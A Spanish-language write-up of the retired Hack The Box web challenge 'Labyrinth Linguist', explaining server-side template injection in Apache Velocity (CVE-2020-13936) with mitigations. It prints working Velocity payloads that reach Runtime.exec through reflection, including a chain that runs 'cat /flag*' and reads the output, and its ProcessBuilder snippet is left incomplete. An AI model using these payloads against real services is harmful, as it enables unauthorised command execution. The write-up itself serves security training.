---
challenge: Labyrinth Linguist
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, java, velocity, ssti, rce, cve-2020-13936]
---

# Labyrinth Linguist — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Aplicación Java (Spring) que «traduce» texto con **Apache Velocity**. La plantilla se construye con la entrada del usuario, así que `#set` permite crear objetos y llegar a `Runtime.exec`: **SSTI** con ejecución de comandos.

## Enunciado y superficie

Un formulario que devuelve el texto en otro idioma. Nada de Flask ni Jinja: aquí el motor es **Velocity 1.7**, afectado por **CVE-2020-13936** (el `Uberspector` por defecto no bloquea la reflexión), y su sintaxis es `#set($var = ...)`.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

Comprobar la sintaxis del motor:

```text
#set($x = 7 * 7) $x
```

Si devuelve `49`, la entrada se evalúa como plantilla Velocity. En Velocity se puede acceder a clases Java por reflexión:

```text
#set($str = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
```

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

```text
#set($s = $class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /flag*"))
#set($in = $s.getInputStream())
#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($in)))
$br.readLine()
```

Más corto con `ProcessBuilder`:

```text
#set($p = $class.inspect("java.lang.ProcessBuilder").type.getConstructor($class.inspect("java.util.List").type))
```

La salida del comando se imprime en la respuesta; con `cat /flag*` aparece la flag.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Comillas y `$`**: la URL debe codificar `#` como `%23` si se envía por GET.
- **`readLine()` una sola vez**: para varias líneas, repetir o usar `System.out`.
- **Sandbox**: si `$class` está bloqueado, probar `$context`/`$request` y los objetos expuestos por el framework.

- Velocity también es SSTI: no hace falta que el motor sea Jinja o Twig.
- `$class.inspect` es el puente a la reflexión de Java y, de ahí, a `Runtime`.
- Mitigación: `VelocityEngine` con contexto de datos, plantillas fijas en disco y `SecureUberspector`.

## Mitigaciones y detección

- No construir plantillas con entrada del usuario; usar sandbox y contexto restringido.

## Referencias

- [CVE-2020-13936](https://nvd.nist.gov/vuln/detail/CVE-2020-13936)
- [ssti](../../knowledge/web/ssti.md)
